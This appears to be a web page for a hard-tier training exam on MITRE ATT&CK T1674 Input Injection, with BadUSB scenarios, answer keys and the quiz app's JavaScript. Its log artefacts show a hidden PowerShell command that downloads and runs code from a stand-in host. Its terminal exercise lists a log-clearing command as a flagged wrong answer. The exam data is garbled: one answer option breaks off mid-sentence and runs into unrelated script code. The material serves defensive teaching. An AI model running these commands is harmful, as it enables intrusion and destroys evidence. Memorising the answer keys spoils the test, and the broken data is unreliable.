<script>
window.__EXAM_DATA__ = {"meta":{"topicId":"t1674","batch":3,"title":"T1674 Input Injection — HARD","difficulty":"hard","questionCount":12,"estimatedMinutes":30,"passMark":70},"techniqueId":"T1674","techniqueName":"Input Injection","objectTypeLabel":"ATT&CK TECHNIQUE","tactic":"Execution (TA0002)","platforms":"Windows, Linux, macOS","severity":{"key":"hard","digit":"3","label":"HARD","short":"H","color":"#f97316"},"timerSec":1800,"introHTML":"\n<h3>You will learn about Input Injection<\/h3>\n<p><b>What kind of ATT&amp;CK object is this?<\/b> T1674 — Input Injection is a <b>Technique<\/b>. In MITRE ATT&amp;CK, a technique describes <i>one concrete way attackers act<\/i>. It is not a product and not a crime group. It is a behaviour that any attacker can use on any of the listed platforms. This page is the parent page of the technique in the Enterprise matrix, and it has no sub-techniques.<\/p>\n<p><b>What does it mean?<\/b> Imagine someone makes your computer believe that keys were pressed on the keyboard — but nobody typed. That is input injection. The fake keystrokes can open the command interpreter with a keyboard shortcut, type a whole inline script that then runs, or interact with a GUI application like a real user. These actions can live inside attacker tooling or come from a physical device — a Human Interface Device (HID), which is the device class that keyboards and mice belong to. The computer runs those actions <b>as you<\/b>, the logged-in user, with your rights. The attacker does not need admin rights to start.<\/p>\n<p><b>Two real examples worth remembering.<\/b> First, the BackSwap banking trojan (2018) used tooling that watched the Windows message loop — the queue that carries every key press and click. When the user opened a bank-specific URL, it simulated keystrokes to open the developer console or select the address bar, pasted malicious JavaScript from the clipboard, and executed it. The bank page could then be manipulated — for example, replacing bank account numbers during a transaction. Second, the FIN7 crime group used malicious USB devices that emulated keystrokes to launch PowerShell, leading to the download and execution of malware from adversary-controlled servers — USBs even mailed to companies as gifts. No file was opened; the \"keyboard\" did the work.<\/p>\n<p><b>Where it sits in the attack.<\/b> T1674 belongs to the <b>Execution tactic (TA0002)<\/b> — the stage where attacker code starts to run on a machine. Often the device itself arrives as <b>Initial Access<\/b> (for example T1200 Hardware Additions: someone plugs the device in). Then the injected keystrokes fire, and what they launch — very often a shell such as PowerShell or bash (T1059, Command and Scripting Interpreter) — does the rest of the attack.<\/p>\n<p><b>Where you will use this at work:<\/b><\/p>\n<div class=\"wgrid\">\n<div class=\"wcell\"><b>SOC analyst<\/b>Triage device-install alerts. A \"new keyboard\" that appears and is followed seconds later by a script is your loudest signal.<\/div>\n<div class=\"wcell\"><b>Threat hunter<\/b>Hunt for HID enumeration followed by unattended command execution. Check input timing against user activity.<\/div>\n<div class=\"wcell\"><b>Incident responder<\/b>Preserve device evidence first, contain the host second, and keep the business running where you can.<\/div>\n<div class=\"wcell\"><b>CTI analyst<\/b>Brief leaders on FIN7-style BadUSB campaigns and write ATT&amp;CK-mapped reports naming T1674, DET0568, M1034 and M1038.<\/div>\n<div class=\"wcell\"><b>Detection engineer<\/b>Build and tune the analytics of detection strategy DET0568 — AN1567 (Windows), AN1568 (Linux), AN1569 (macOS) — and cut false positives from docks, KVM switches and scanners.<\/div>\n<div class=\"wcell\"><b>Red teamer<\/b>Use HID emulators in authorized physical tests, then document why the path worked and what would have caught it.<\/div>\n<div class=\"wcell\"><b>GRC / control owner<\/b>Own M1034 (limit hardware installation: device-install policy, port controls) and M1038 (execution prevention: script control such as PowerShell Constrained Language Mode, which restricts dangerous elements like Add-Type).<\/div>\n<\/div>\n<p style=\"margin-top:10px\"><b>What risks does it address?<\/b> Actions that look exactly like trusted user work; payment pages changed inside the browser; malware \"typed\" onto a machine by a device; and the hard truth that blocking USB storage alone does not stop it, because the malicious device claims to be a keyboard, not a disk.<\/p>\n<div class=\"arte\" style=\"margin-top:12px\"><div class=\"arte-t\">THIS TIER<\/div><div class=\"arte-b\">This HARD tier gives you realistic artefact sets and answers that are almost right — you must separate them with reasons, not keywords.<\/div><\/div>","rulesHTML":"\n<h3>How this exam works<\/h3>\n<ul class=\"rules\">\n<li><b>Goal:<\/b> master T1674 — Input Injection at <b style=\"color:#f97316\">HARD<\/b> level. Two to three interacting concepts, realistic artefact sets, and near-miss answers that are wrong for a specific, explainable reason; hints only remove one wrong path.<\/li>\n<li><b>Passing score:<\/b> 70%. The score is computed only over exercises you actually answer.<\/li>\n<li><b>12 exercises<\/b>, one question per screen. Every screen has three fixed blocks: <b>SCENARIO<\/b>, <b>QUESTION<\/b>, <b>YOUR ANSWER<\/b>. Types in this file: multi-artefact correlation, a dual red-team/blue-team perspective pair, detection-flaw review, ATT&CK matrix placement, containment ordering, a keyword-drafted CTI note, and one terminal command where the tool is not named.<\/li>\n<li><b>Timer:<\/b> 30 minutes for the whole file. You can pause — while paused the exercise is hidden and the clock is stopped.<\/li>\n<li><b>Hints:<\/b> one hint per exercise, and it costs 10% of that exercise's points. It nudges you; it never reveals the answer.<\/li>\n<li><b>Skips:<\/b> every exercise has a Skip button and skipping is free. Before you can finish, a \"Review skipped\" screen lets you return to skipped exercises as many times as you want while the timer runs. If you submit with skipped exercises unanswered, they are excluded from the score: not correct, not wrong, and their points are removed from the total.<\/li>\n<li><b>Retake:<\/b> if you fail, retake the exam — the exercise order and all answer choices are reshuffled.<\/li>\n<\/ul>\n","keywords":[{"theme":"Behaviour & Mechanics","chips":[{"t":"keystroke simulation","s":"1234"},{"t":"keyboard-shortcut shell launch","s":"12"},{"t":"inline script typing","s":"2"},{"t":"GUI application interaction","s":"23"},{"t":"acts with the user’s own rights","s":"13"},{"t":"preprogrammed tooling","s":"12"},{"t":"clipboard paste into console","s":"24"},{"t":"browser developer console","s":"23"},{"t":"Windows message loop","s":"23"},{"t":"browser content / account-number swap","s":"2"}]},{"theme":"Devices & Delivery","chips":[{"t":"HID (Human Interface Device)","s":"1234"},{"t":"BadUSB","s":"134"},{"t":"USB keyboard emulation","s":"12"},{"t":"mailed USB social engineering","s":"14"},{"t":"physical access requirement","s":"13"}]},{"theme":"Tactics & Matrix Position","chips":[{"t":"Execution tactic (TA0002)","s":"1234"},{"t":"T1059 Command and Scripting Interpreter as next step","s":"23"},{"t":"T1200 Hardware Additions (arrival)","s":"3"},{"t":"Initial Access vs Execution boundary","s":"3"}]},{"theme":"Platforms & Permissions","chips":[{"t":"Windows","s":"123"},{"t":"Linux","s":"123"},{"t":"macOS","s":"234"},{"t":"no admin rights required","s":"23"},{"t":"user-privilege execution context","s":"13"}]},{"theme":"Data Sources & Telemetry","chips":[{"t":"HID device enumeration events","s":"1234"},{"t":"WinEventLog:System EventCode 2003 (drive/device creation)","s":"23"},{"t":"WinEventLog:Security 4688 process creation","s":"23"},{"t":"PowerShell 4103/4104 script-block logs","s":"234"},{"t":"/sys/bus/usb/devices/ enumeration","s":"123"},{"t":"auditd execve from USB/HID handler","s":"4"},{"t":"ioreg -p IOUSB","s":"24"},{"t":"macOS unified log","s":"4"},{"t":"unattended command execution","s":"234"},{"t":"input timing / no user context","s":"234"}]},{"theme":"Detection Logic & Analytics","chips":[{"t":"DET0568 detection strategy","s":"34"},{"t":"AN1567 (Windows)","s":"234"},{"t":"AN1568 (Linux)","s":"24"},{"t":"AN1569 (macOS)","s":"24"},{"t":"rogue devices presenting as keyboards","s":"13"},{"t":"rapid no-context input sequences","s":"3"},{"t":"scripts executed via simulated keys","s":"3"},{"t":"false-positive sources: docks, KVM, scanners","s":"34"}]},{"theme":"Mitigations & Controls","chips":[{"t":"M1038 Execution Prevention","s":"234"},{"t":"PowerShell Constrained Language Mode","s":"24"},{"t":"Add-Type / Win32 API restriction","s":"24"},{"t":"M1034 Limit Hardware Installation","s":"134"},{"t":"device-install restriction policy","s":"34"},{"t":"browser-path hardening gap","s":"34"}]},{"theme":"Real-World Procedures","chips":[{"t":"FIN7 (G0046) BadUSB campaign","s":"134"},{"t":"BackSwap banking trojan","s":"23"},{"t":"FBI mailed-USB warnings","s":"4"},{"t":"PowerShell downloader payload","s":"123"}]},{"theme":"SOC / IR / CTI Workflow","chips":[{"t":"alert triage & correlation","s":"23"},{"t":"evidence preservation","s":"34"},{"t":"containment with business cost","s":"4"},{"t":"attribution calibration","s":"34"},{"t":"executive ATT&CK briefing","s":"34"}]}],"exercises":[{"id":"H3","type":"logview","theme":"Detection Logic & Analytics","tag":"Defender","persp":"defender","title":"Dock or dongle?","scenario":[{"label":"ARTEFACT 1 — System + PowerShell logs (FIN-WS-118)","text":"09:58:21  EV2003  Driver install: USB Input Device (HID keyboard) — vendor 0x2C0F\n09:58:24  EV4688  New process: powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxp://evil[.]example/x')\"\n09:58:25  EV4104  Script block logged: DownloadString hxxp://evil[.]example/x\n09:58:26  EV2003  Driver install: USB Input Device (HID) — port 2"},{"label":"ARTEFACT 2 — Ticket #4471 (user reply)","text":"\"I only plugged in my headset dock at 09:58. Nothing else. I typed nothing.\""},{"label":"ARTEFACT 3 — Asset database","text":"Assigned dock model: DK-300. Vendor datasheet: enumerates as USB Audio + USB Hub. It does NOT create a HID keyboard interface. Badge: user at desk since 09:30."}],"summary":"Three artefacts — dock claim vs HID keyboard evidence","question":"Which assessment best fits all three artefacts?","hint":"The user is honest — the dock really is theirs. Check what the asset database says the dock should enumerate as.","explain":"The dock model enumerates as audio + hub, never as a HID keyboard — yet a HID keyboard installed twice at 09:58 with an encoded PowerShell download three seconds later, and the user typed nothing. This is a rogue device presenting as a keyboard (AN1567's third pattern) wrapped in a believable story. The shortcut answer \"user typed it themselves\" is contradicted by the ticket; \"driver reinstall\" is contradicted by the datasheet; RDP has no artefact support.","study":"AN1567 — rogue devices presenting themselves as keyboards; correlate before closing.","log":{"title":"System + PowerShell logs (FIN-WS-118)","lines":[{"t":"09:58:21  EV2003  Driver install: USB Input Device (HID keyboard) — vendor 0x2C0F","cls":"warn"},{"t":"09:58:24  EV4688  New process: powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxp://evil[.]example/x')\"","cls":"crit"},{"t":"09:58:25  EV4104  Script block logged: DownloadString hxxp://evil[.]example/x","cls":"crit"},{"t":"09:58:26  EV2003  Driver install: USB Input Device (HID) — port 2","cls":"warn"}]},"answer":{"kind":"qcm","options":["The user typed the command themselves and forgot about it","Docking station driver reinstall; the commands are routine background work","Rogue HID injection: a device posed as a keyboard and commands followed at once","A remote administration session ran the PowerShell commands"],"correct":[2]}},{"id":"H1","type":"qcm","theme":"Behaviour & Mechanics","tag":"Red team","persp":"attacker","title":"Red: why the dongle","scenario":[{"label":"ARTEFACT 1 — Engagement brief","text":"Authorized physical red-team test. Scope: 4th floor of a bank back office. Target: a Windows 11 workstation whose session was left unlocked during a 20-minute meeting. You carry a small HID-emulating dongle. Network egress is heavily monitored, and USB storage devices are blocked by DLP."},{"label":"ARTEFACT 2 — Your kit","text":"Available: HID-emulating dongle (preprogrammed keystroke payload), USB storage stick, wireless tools. Rules of engagement: authorized, no persistence beyond the test window, document everything."}],"summary":"Red-team physical test — why choose HID injection over a storage stick?","question":"Why pick HID keystroke injection over plugging in a USB stick with payload files?","hint":"Ask what the dongle must rely on: an unlocked session and the user's own rights — and what the storage control would do to the stick.","explain":"The dongle types as the logged-in user: nothing needs to be opened, and no file has to survive the DLP storage block — the \"keyboard\" carries the payload as keystrokes. It does not grant admin rights, it does not evade the device logs (PnP device-install events will exist), and it gives no persistence after reboot. Trade-offs accepted: you need an unlocked session and a short physical window.","study":"T1674 attacker trade-offs — user-context execution vs storage controls.","perspNote":"Red view: keystrokes ride the trusted user session. Blue view: the same ride is visible as device-install + unattended execution — exactly what the next exercise asks you to detect.","options":["It hides the device from the Windows event log","It automatically grants administrator rights to the payload","Typed input runs as the logged-in user with nothing to open","It keeps running in the background after a reboot"],"correct":[2]},{"id":"H2","type":"qcm","theme":"Data Sources & Telemetry","tag":"Blue team","persp":"defender","title":"Blue: one telemetry to add","scenario":[{"label":"ARTEFACT 1 — Same engagement, blue side","text":"Authorized physical red-team test. Scope: 4th floor of a bank back office. Target: a Windows 11 workstation whose session was left unlocked during a 20-minute meeting. You carry a small HID-emulating dongle. Network egress is heavily monitored, and USB storage devices are blocked by DLP.\n\nThe red team report later confirms the dongle path worked."},{"label":"ARTEFACT 2 — Current telemetry","text":"The bank SOC has: DNS logs, process creation logs (4688), and weekly antivirus reports. It has NO device/HID telemetry. The red visit produced no alert at all."}],"summary":"Blue side — which single telemetry addition catches this path best?","question":"Which single telemetry addition catches this path best?","hint":"What did the attacker physically add, and at which moment did the commands start?","explain":"The T1674 path is a new HID device followed seconds later by unattended execution. So the best single addition is device-install (PnP/HID enumeration) telemetry correlated with process starts — that is AN1567's core: EventCode 2003 device installs joined to 4688 process creation (and PowerShell 4104 script blocks for the payload). More DNS adds volume but sees no typing; browser exports and AV reports are too slow and too indirect.","study":"DET0568 — AN1567 log sources: EventCode 2003, 4688, PowerShell 4103/4104.","perspNote":"Same scenario, two sides: H1 asked why the attacker wins; H2 asks which sensor makes them lose.","options":["Daily antivirus definition status reports from the console","More DNS request logs pulled from the egress proxy","Weekly browser history exports collected from the fleet","Device-install events joined to unattended process starts"],"correct":[3]},{"id":"H4","type":"qcm","theme":"Detection Logic & Analytics","tag":"Detection engineering","persp":"defender","title":"Review the draft analytic","scenario":[{"label":"ARTEFACT 1 — Junior analytic draft","text":"RULE name: usb_any_connect_v1\nLOGIC: ALERT on ANY USB device connect event (any class, any vendor, any port) on any endpoint.\nTUNING: none yet."},{"label":"ARTEFACT 2 — Fleet reality","text":"A 2,000-endpoint office fleet connects and reconnects mice, keyboards, webcams, headset docks, KVM switches and barcode scanners all day. Average 6,100 USB connect events per hour, fleet-wide."}],"summary":"Draft analytic fires on every USB connect event","question":"What is the main flaw of this draft analytic?","hint":"Every mouse and dock will trip this rule all day. What did AN1567 actually look for?","explain":"Firing on every USB connect floods the queue and misses what makes T1674 special: the behaviour — rapid no-context input, scripts executed through simulated keys, and devices posing as keyboards. AN1567 joins enumeration WITH injection patterns; that is the detection, not mere connection volume. The other options misread the problem: the rule fires too often, works on any OS where the logs exist, and needs no special rights.","study":"AN1567 logic — enumeration + injection patterns, not connection volume.","options":["It fires far too rarely to ever be useful in a big fleet","It alerts on connections, not on the injection behaviour","It only works on macOS hosts and never on Windows","It needs administrator rights just to evaluate the alerts"],"correct":[1]},{"id":"H5","type":"terminal","theme":"Data Sources & Telemetry","tag":"Unsupervised terminal","title":"Pull the device-install events (Windows)","persp":"defender","perspLabel":"Defender","scenario":[{"label":"ARTEFACT 1 — Live host, case FIN-2291","text":"Windows 11 finance workstation, live. Window: 10 minutes while the team is at lunch. Objective: pull every device-install event — event ID 2003 from the System log — for the incident report. Nothing else mixed in."},{"label":"ARTEFACT 2 — Environment","text":"Your session is an elevated PowerShell console on the host. Several tools can read event logs; only one style of query returns exactly the 2003 device installs. Near-miss commands really run here — read what you got before you submit."}],"summary":"Terminal — read System log EventCode 2003 with a provider-level filter","question":"Type the command that reads the System log and returns only the event ID 2003 events.","hint":"One cmdlet family reads event logs; the hashtable-style filter takes a log name and an ID — not the whole log.","explain":"Canonical command: Get-WinEvent -FilterHashtable @{LogName='System';Id=2003}\n\nGet-WinEvent — the modern PowerShell event-log reader. -FilterHashtable — filters inside the provider, so the host does not drag the whole log into memory. LogName='System' — the Windows channel where PnP device installs land. Id=2003 — the device/driver-install event that AN1567 joins with process creation (4688) and PowerShell script blocks (4104). wevtutil qe System /q:\"...\" is the classic-CLI equivalent — also accepted here. Near-misses: no ID filter drowns you in the whole log; Id=4688 pulls the process half, not the device half; -ListLog shows log metadata, not events; wevtutil el lists log NAMES. And wevtutil cl System CLEARS the System log — evidence destruction on a live case, never run it.","study":"AN1567 Windows sources — System log EventCode 2003 device installs, joined with 4688 process creation and 4103-4106 script blocks.","os":"Windows 11 — PowerShell (live host)","prompt":"PS C:\\Users\\responder>","banner":"Simulation shell — near-miss commands really run; read their output.","accepted":[{"re":"^get-winevent\\s+-filterhashtable\\s+\\@\\{\\s*logname\\s*=\\s*['\\\"']?system['\\\"']?\\s*;\\s*id\\s*=\\s*2003\\s*\\}$","ok":true,"out":"  Index  Time      Level        Source                     Message\n  8412   09:58:21  Information  Microsoft-Windows-UserPnp  Driver Management concluded the process to install driver usb_input.inf for the HID keyboard device (ID 2003)\n  8419   09:58:26  Information  Microsoft-Windows-UserPnp  Device installed: HID-compliant USB keyboard (usb_input.inf)"},{"re":"^get-winevent\\s+-filterhashtable\\s+\\@\\{\\s*id\\s*=\\s*2003\\s*;\\s*logname\\s*=\\s*['\\\"']?system['\\\"']?\\s*\\}$","ok":true,"out":"  Index  Time      Level        Source                     Message\n  8412   09:58:21  Information  Microsoft-Windows-UserPnp  Driver Management concluded the process to install driver usb_input.inf for the HID keyboard device (ID 2003)\n  8419   09:58:26  Information  Microsoft-Windows-UserPnp  Device installed: HID-compliant USB keyboard (usb_input.inf)"},{"re":"^wevtutil\\s+qe\\s+system\\s+/q:\\S*2003\\S*(\\s+/f:\\w+)?$","ok":true,"out":"(query applied — 2 matching events, text format)\n8412  09:58:21  Driver Management concluded the process to install driver usb_input.inf (HID keyboard)\n8419  09:58:26  Device installed (usb_input.inf) — HID-compliant device"},{"re":"^get-winevent\\s+-logname\\s+system$","ok":false,"out":"(whole System log) 4,102 events, oldest first... you wanted only the 2003 device installs. Add the ID filter."},{"re":"^get-eventlog\\b","ok":false,"out":"(legacy Get-EventLog dump) mixed classic events, no ID filter — the 2003 device installs are buried in noise."},{"re":"^get-winevent\\s+-filterhashtable\\s+\\@\\{.*4688.*\\}$","ok":false,"out":"96 process-creation events (ID 4688)... that is the process half of AN1567, not the device-install half you were asked to pull."},{"re":"^get-winevent\\s+-listlog\\s+system$","ok":false,"out":"LogName: System — file size, record count, log mode... that is log metadata, not the events themselves."},{"re":"^wevtutil\\s+el$","ok":false,"out":"Application, System, Security, Setup... that lists log NAMES, not events."},{"re":"^wevtutil\\s+cl\\s+system$","ok":false,"danger":true,"out":"(System log CLEARED) — the device-install evidence is gone. On a live case this is evidence destruction."}],"canonical":"Get-WinEvent -FilterHashtable @{LogName='System';Id=2003}"},{"id":"H6","type":"qcm","theme":"Real-World Procedures","tag":"Attribution","title":"FIN7 vs the other story","scenario":[{"label":"CTI exam question","text":"Two T1674 stories exist on the ATT&CK page: a 2018 banking trojan that watched the Windows message loop and pasted JavaScript into bank pages, and a crime group that mailed malicious USBs whose keystrokes launched PowerShell.\n\nYour lead asks which statement matches the ATT&CK procedure example table — actor and behaviour together."}],"summary":"Which statement matches the ATT&CK procedure example exactly?","question":"Which statement matches the ATT&CK procedure example for T1674?","hint":"The message-loop trick belongs to the 2018 banking trojan — a different actor than the one in the procedure table.","explain":"The procedure example table credits FIN7 (G0046): malicious USBs emulating keystrokes to launch PowerShell and download malware from the adversary's server. The message-loop/console/JavaScript story is the BackSwap banking trojan from the technique description — a different actor, not FIN7. RF jamming and RDP brute force are unrelated inventions. Precision matters: reports that swap actors destroy credibility.","study":"T1674 procedure examples — G0046 FIN7; description refs — BackSwap.","options":["FIN7 brute-forced RDP passwords to type its commands","FIN7 watched the message loop and pasted JavaScript into banks","FIN7 jammed wireless keyboards with radio-frequency noise","FIN7 used mailed malicious USBs whose keystrokes launched PowerShell"],"correct":[3]},{"id":"H7","type":"qcm","theme":"Mitigations & Controls","tag":"Defender","persp":"defender","title":"Control the right gap","scenario":[{"label":"ARTEFACT 1 — Current state","text":"The bank implemented M1034 (Limit Hardware Installation): unapproved USB device classes cannot install. A peer's audit note says: \"T1674 fully mitigated.\""},{"label":"ARTEFACT 2 — The other path","text":"The technique description also documents a browser path: tooling watches the Windows message loop, opens the developer console or address bar on bank URLs, pastes JavaScript from the clipboard, and executes it — no USB device involved."}],"summary":"M1034 deployed — which control statement covers the remaining gap?","question":"Which control statement correctly covers the gap the audit missed?","hint":"Ask what M1034 actually limits — devices, or browsers?","explain":"M1034 limits device installation — it blunts the USB path only. The browser path never presents a device: it rides software keystrokes inside an already-running tool, so it needs browser/script hardening (script controls, dev-console policies, CLM per M1038 for the scripting side). Claiming full mitigation is premature; DNS logging cannot stop pasted JavaScript; disabling JavaScript \"in the OS\" is not a real control.","study":"T1674 mitigations — M1034 scope vs software/browser-path hardening.","options":["Faster DNS logging would stop the pasted JavaScript cold","M1034 also blocks in-browser keystroke tricks completely here","M1034 is device-only; the browser path needs script hardening","Disabling JavaScript inside the operating system is the fix"],"correct":[2]},{"id":"H8","type":"order","theme":"SOC / IR / CTI Workflow","tag":"Workflow","persp":"defender","title":"Order the IR steps","scenario":[{"label":"IR planning board","text":"A BadUSB is confirmed on one finance workstation (live case). Four actions are on the board, shuffled:\n\nA. Unplug the device and isolate the host from the network.\nB. Photograph the device, note the port, capture device-install logs.\nC. Block that device class org-wide and sweep peer finance hosts.\nD. Pull PnP, process and PowerShell logs for the incident window.\n\nPut them in the order a responder should do them."}],"summary":"Order four IR actions for a confirmed BadUSB case","question":"Put the four actions in the correct order, first at the top.","hint":"You cannot inventory what you already destroyed — and org-wide hardening comes after you understand the case.","explain":"Evidence first: photograph and capture device state/logs before touching anything (B). Then contain: unplug and isolate (A). Then investigate the window: PnP + process + PowerShell logs (D). Only then harden and widen: device-class block and peer sweep (C). Reversing B and A destroys volatile evidence; jumping to C first hardens before you know what you face.","study":"IR ordering — preserve, contain, investigate, harden.","items":["Photograph the device, note the port, capture device-install logs","Unplug the device and isolate the host from the network","Pull PnP, process and PowerShell logs for the incident window","Block that device class org-wide and sweep peer finance hosts"],"mode":"steps"},{"id":"H9","type":"categorize","theme":"Tactics & Matrix Position","tag":"Matrix","title":"Place five techniques","scenario":[{"label":"ATT&CK matrix excerpt","text":"Your CTI lead shows a blank excerpt with three columns: Initial Access, Execution, Persistence.\n\n\"Place these five,\" she says. \"And think carefully: the BadUSB device arrives in one column and does its work in another.\""}],"summary":"Place five techniques into three tactic columns","question":"Drag each technique into its correct tactic column.","hint":"Hardware Additions is how the device ARRIVES — not what it does after.","explain":"T1200 Hardware Additions: the device physically arrives — Initial Access. T1566 Phishing: also Initial Access (a different delivery route). T1674 Input Injection and T1059 Command and Scripting Interpreter: the typed keys and the shell they launch — Execution. T1098 Account Manipulation: changes accounts for lasting access — Persistence. The arrival/work boundary between T1200 and T1674 is the classic matrix question here.","study":"ATT&CK matrix — T1200 (Initial Access) vs T1674/T1059 (Execution) vs T1098 (Persistence).","zones":[{"name":"Initial Access","desc":"How the attacker gets in"},{"name":"Execution","desc":"Where attacker code starts to run"},{"name":"Persistence","desc":"Keeping access over time"}],"items":[{"t":"T1200 — Hardware Additions","z":0},{"t":"T1566 — Phishing","z":0},{"t":"T1674 — Input Injection","z":1},{"t":"T1059 — Command and Scripting Interpreter","z":1},{"t":"T1098 — Account Manipulation","z":2}]},{"id":"H10","type":"multi","theme":"Detection Logic & Analytics","tag":"Defender","persp":"defender","title":"Three AN1567 signals","scenario":[{"label":"Tuning workshop","text":"Your SOC tunes the Windows analytic for input injection. The analytic text (AN1567): \"Detects suspicious USB HID device enumeration and keystroke injection patterns, such as rapid sequences of input with no user context, scripts executed through simulated keystrokes, or rogue devices presenting themselves as keyboards.\"\n\nWhich THREE signals are exactly the patterns this analytic detects?"}],"summary":"Select the three AN1567 detection patterns","question":"Which THREE signals are the patterns AN1567 detects?","hint":"Re-read the analytic line: it lists three patterns about input and keyboards — nothing about CPUs or VPNs.","explain":"AN1567 names exactly three patterns: rapid sequences of input with no user context; scripts executed through simulated keystrokes; and rogue devices presenting themselves as keyboards. A CPU spike in a database engine and failed VPN logins from a new country are real alerts — but for other techniques; they have nothing to do with keystroke injection.","study":"DET0568 — AN1567 (Windows) pattern list, verbatim.","options":["Rapid sequences of input with no user context","Scripts executed through simulated keystrokes","Devices presenting themselves as keyboards","A CPU spike inside the database engine","Two failed VPN logins from a new country"],"correct":[0,1,2]},{"id":"H11","type":"branch","theme":"SOC / IR / CTI Workflow","tag":"Workflow","persp":"defender","title":"Lead the case, three steps","scenario":[{"label":"Case brief","text":"Finance workstation FIN-WS-077. Evidence so far: HID keyboard installed at 09:12:03; encoded PowerShell spawned at 09:12:07; EDR shows NO file dropped. The user is in a meeting until 10:00. You lead the case."}],"summary":"Three-step case leadership for a suspected BadUSB host","question":"Lead the case through three decisions.","hint":"Evidence first, scope second, controls last — and never destroy what you have not captured.","explain":"Step 1: freeze the scene — keep the device, snapshot device state and logs; wiping destroys evidence and learns nothing. Step 2: CLM blocked the PowerShell download, but the payload may have arrived another way — confirm before declaring clean. Step 3: the right spend pairs device-class limits (M1034) with an AN1567-style correlation alert; a bigger firewall sees no keystrokes, and posters alone change little.","study":"IR case leadership — evidence, scope, control investment.","steps":[{"scenario":[{"label":"STEP 1 — First move","text":"The device may still be plugged in. Nothing is captured yet. What do you order first?"}],"question":"What is your first order?","options":["Freeze the scene: keep the device attached, snapshot device state and logs","Unplug everything and wipe the machine right now","Email the whole floor to stop using docking stations"],"correct":0,"ok":"You preserved volatile device evidence before anyone touched the port — the correct least-aggressive first move.","bad":"Wiping destroys the only device evidence and answers nothing. And a floor-wide email tips off observers while the case is blind."},{"scenario":[{"label":"STEP 2 — The CLM surprise","text":"PowerShell is in Constrained Language Mode (M1038). The typed download from hxxp://evil[.]example/x was blocked. Nothing else has fired yet."},{"label":"Question the team is asking","text":"\"CLM blocked it — case closed?\""}],"question":"What do you conclude and do next?","options":["Declare the 'use strict';
/* ---------- utils ---------- */
function $(id){return document.getElementById(id);}
function el(tag,cls,html){var e=document.createElement(tag);if(cls)e.className=cls;if(html!==undefined&&html!==null)e.innerHTML=html;return e;}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function shuffle(a){var r=a.slice();for(var i=r.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=r[i];r[i]=r[j];r[j]=t;}return r;}
function reducedMotion(){return window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;}
function letters(i){return String.fromCharCode(65+i);}
function normCmd(c){return String(c||'').replace(/\s+/g,' ').trim().toLowerCase();}
function ptext(s){return esc(s).replace(/\n/g,'<br>');}

/* ---------- data & state ---------- */
var D = window.__EXAM_DATA__;
var S = {
  phase:'intro', order:[], idx:0, widgets:{}, work:{},
  timeLeft:D.timerSec, timerId:null, paused:false,
  fromReview:false, reported:false, learner:''
};
function res(id){
  if(!S.work[id]) S.work[id]={status:null,frac:0,awarded:0,hintUsed:false,submitted:false,viewed:false};
  return S.work[id];
}
function answeredList(){
  return S.order.map(function(i){return D.exercises[i];}).filter(function(ex){var r=S.work[ex.id];return r&&(r.status==='correct'||r.status==='partial'||r.status==='wrong');});
}
function skippedList(){
  return S.order.map(function(i){return D.exercises[i];}).filter(function(ex){var r=S.work[ex.id];return r&&r.status==='skipped';});
}
function earnedPoints(){var n=0;answeredList().forEach(function(ex){n+=S.work[ex.id].awarded;});return n;}
function possiblePoints(){return answeredList().length*10;}
function liveScore(){return earnedPoints();}

/* ---------- header ---------- */
function renderHeader(){
  var tb=$('topbar');tb.innerHTML='';
  var row=el('div','row');
  var brand=el('div','brand','<span class="tid">'+esc(D.meta.topicId.toUpperCase())+'</span> '+esc(D.techniqueName));
  row.appendChild(brand);
  var sev=el('span','pill sev','<span style="width:9px;height:9px;border-radius:99px;display:inline-block;background:'+D.severity.color+'"></span> '+esc(D.severity.label));
  row.appendChild(sev);
  var count=el('span','hstat','',null);
  if(S.phase==='exam'){
    count.innerHTML='Exercise <b>'+(S.idx+1)+' of '+S.order.length+'</b>';
  } else if(S.phase==='review'){
    count.innerHTML='<b>Review skipped</b> — '+skippedList().length+' waiting';
  } else if(S.phase==='results'){
    count.innerHTML='<b>Results</b>';
  } else {count.innerHTML='<b>Intro</b>';}
  row.appendChild(count);
  var timer=el('span','hstat','&#9202; <b id="clock">'+fmtTime(S.timeLeft)+'</b>');
  row.appendChild(timer);
  var score=el('span','hstat','Score <b id="scorelive">'+liveScore()+' pts</b>');
  row.appendChild(score);
  var gap=el('span','');gap.style.flex='1';row.appendChild(gap);
  if(S.phase==='exam'){
    var ex=cur();
    var hb=el('button','hbtn warnb','&#128161; Hint &minus;10%');
    var r=res(ex.id);
    hb.disabled=(r.hintUsed||r.submitted);
    hb.addEventListener('click',function(){useHint(ex);});
    row.appendChild(hb);
    var sb=el('button','hbtn skipb','&#9888; Skip');
    sb.disabled=r.submitted;
    sb.addEventListener('click',function(){skipCurrent(ex);});
    row.appendChild(sb);
    var pb=el('button','hbtn',(S.paused?'\u25B6 Resume':'\u23F8 Pause'));
    pb.addEventListener('click',function(){togglePause();});
    row.appendChild(pb);
  }
  tb.appendChild(row);
  var pbw=el('div','');pbw.id='pbar';
  var pf=el('div','');pf.id='pfill';
  pf.style.background='linear-gradient(90deg,'+D.severity.color+',#38bdf8)';
  var done=answeredOrSkippedCount();
  var frac=S.order.length? (done/S.order.length):0;
  if(S.phase==='results')frac=1;
  pf.style.width=Math.round(frac*100)+'%';
  pbw.appendChild(pf);tb.appendChild(pbw);
}
function answeredOrSkippedCount(){return S.order.filter(function(i){var r=S.work[D.exercises[i].id];return r&&r.status;}).length;}
function fmtTime(s){var m=Math.floor(s/60),ss=s%60;return (m<10?'0':'')+m+':'+(ss<10?'0':'')+ss;}
function tick(){
  if(S.paused)return;
  S.timeLeft--;
  var c=$('clock');if(c)c.textContent=fmtTime(Math.max(0,S.timeLeft));
  if(S.timeLeft<=0){stopTimer();finishExam(true);}
}
function startTimer(){stopTimer();S.timerId=setInterval(tick,1000);}
function stopTimer(){if(S.timerId){clearInterval(S.timerId);S.timerId=null;}}
function togglePause(){
  S.paused=!S.paused;
  if(S.paused){
    var ov=el('div','pauseov');
    ov.innerHTML='<h2>&#9208; Timer paused</h2><p class="mut">The exercise is hidden while you take a break.<br>The clock is stopped. Nothing is graded.</p>';
    var b=el('button','mainbtn','\u25B6 Resume exam');
